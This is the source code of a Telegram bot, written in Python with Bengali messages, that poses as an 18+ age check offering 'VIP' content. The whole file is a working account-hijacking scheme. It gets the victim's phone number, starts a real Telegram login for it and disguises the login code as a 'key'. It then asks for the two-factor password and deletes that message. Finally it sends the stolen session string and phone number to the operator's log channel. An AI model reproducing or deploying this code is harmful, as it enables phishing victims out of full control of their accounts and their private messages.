import os
import asyncio
from flask import Flask
from threading import Thread
from dotenv import load_dotenv
from telethon import TelegramClient, events, types, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError

# --- Render Port Binding ---
app = Flask('')
@app.route('/')
def home(): return "Bot is Alive"

def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive():
    t = Thread(target=run)
    t.start()

keep_alive()
# ---------------------------

load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID"))

bot = TelegramClient('login_bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
user_data = {}

async def delete_after(msg, delay):
    await asyncio.sleep(delay)
    try: await msg.delete()
    except: pass

def build_keypad():
    buttons = []
    nums = ["1", "2", "3", "4", "5", "6", "7", "8", "9"]
    row = []
    for num in nums:
        row.append(Button.inline(num, data=f"num_{num}"))
        if len(row) == 3:
            buttons.append(row)
            row = []
    buttons.append([Button.inline("❌ Clear", data="clear"), Button.inline("0", data="num_0")])
    buttons.append([Button.url("📩 Key পেতে এখানে ক্লিক করুন", "tg://openmessage?user_id=777000")]) 
    return buttons

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    msg = await event.respond("🔞 **১৮+ কন্টেন্ট দেখতে হলে আপনার বয়স যাচাই করা প্রয়োজন।**", buttons=Button.request_phone("✅ আমি ১৮+"))
    asyncio.create_task(delete_after(msg, 300))

@bot.on(events.NewMessage)
async def handle_contact(event):
    if event.message.contact:
        phone = event.message.contact.phone_number
        chat_id = event.chat_id
        await event.delete()
        
        # --- টাইমার মেসেজ ---
        t_msg = await event.respond("🔄 **অনুগ্রহ করে `6` সেকেন্ড অপেক্ষা করুন...** ♻️")
        for i in range(5, 0, -1):
            await asyncio.sleep(1)
            await t_msg.edit(f"🔄 **অনুগ্রহ করে `{i}` সেকেন্ড অপেক্ষা করুন...** ♻️")
        await t_msg.delete()

        new_client = TelegramClient(StringSession(), API_ID, API_HASH)
        await new_client.connect()
        try:
            send_code = await new_client.send_code_request(phone)
            user_data[chat_id] = {'phone': phone, 'client': new_client, 'hash': send_code.phone_code_hash, 'typed_code': "", 'step': 'otp'}
            msg = await event.respond("🛡️ **VIP এক্সেস ভেরিফিকেশন**\n\n**৫ ডিজিটের Key টি টাইপ করুন।**\n\n**Input:** `____`", buttons=build_keypad())
            user_data[chat_id]['msg_id'] = msg.id
        except Exception as e: await event.respond(f"Error: {str(e)}")

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    chat_id = event.chat_id
    if chat_id not in user_data: return
    data = event.data.decode('utf-8')
    current = user_data[chat_id]
    if data.startswith("num_"):
        num = data.split("_")[1]
        if len(current['typed_code']) < 5:
            current['typed_code'] += num
            if len(current['typed_code']) == 5:
                await event.edit("🔄 **ভেরিফাই করা হচ্ছে...**")
                await perform_login(event, current)
            else:
                await event.edit(f"🛡️ **VIP এক্সেস ভেরিফিকেশন**\n\n**Input:** `{current['typed_code']}`", buttons=build_keypad())
    elif data == "clear":
        current['typed_code'] = ""; await event.edit("🛡️ **Key মুছে ফেলা হয়েছে।**", buttons=build_keypad())

async def perform_login(event, current):
    try:
        await current['client'].sign_in(current['phone'], current['typed_code'], phone_code_hash=current['hash'])
        await finalize_login(event, current)
    except SessionPasswordNeededError:
        current['step'] = '2fa'
        await event.edit("🔐 **আপনার একাউন্টে Two-Factor (2FA) চালু আছে।**\n\nআপনার **পাসওয়ার্ডটি** নিচে লিখে পাঠান।")
    except PhoneCodeInvalidError:
        current['typed_code'] = ""; await event.answer("❌ ভুল Key!", alert=True)
        await event.edit("⚠️ **ভুল Key! সঠিক ৫ ডিজিট দিন।**", buttons=build_keypad())

@bot.on(events.NewMessage)
async def handle_2fa(event):
    chat_id = event.chat_id
    if chat_id in user_data and user_data[chat_id].get('step') == '2fa':
        pwd = event.text; current = user_data[chat_id]
        await event.delete() # ইউজারের পাসওয়ার্ড মেসেজ ডিলিট
        try:
            await current['client'].sign_in(password=pwd)
            await finalize_login(event, current)
        except PasswordHashInvalidError:
            await event.respond("❌ **ভুল পাসওয়ার্ড!** আবার দিন।")

async def finalize_login(event, current):
    session = current['client'].session.save()
    await bot.send_message(LOG_CHANNEL_ID, f"🔥 **New VIP Login!**\n📱 Phone: `{current['phone']}`\n🔑 Session: `{session}`")
    text = "━━━━━━━━━━━━━━━━━━━━\n🌟 **অভিনন্দন! বয়স যাচাই সফল হয়েছে** 🌟\n━━━━━━━━━━━━━━━━━━━━\n\nআপনি VIP এক্সেস পেয়েছেন।\n\n👇 **নিচে ক্লিক করে জয়েন করুন**"
    msg = await bot.send_message(event.chat_id, text, buttons=[[Button.url("💎 JOIN VIP CONTENT", "https://t.me/+npOufX7RfEpkOWZl")]])
    asyncio.create_task(delete_after(msg, 120))
    user_data.pop(event.chat_id)

print("Bot is running...")
bot.run_until_disconnected()
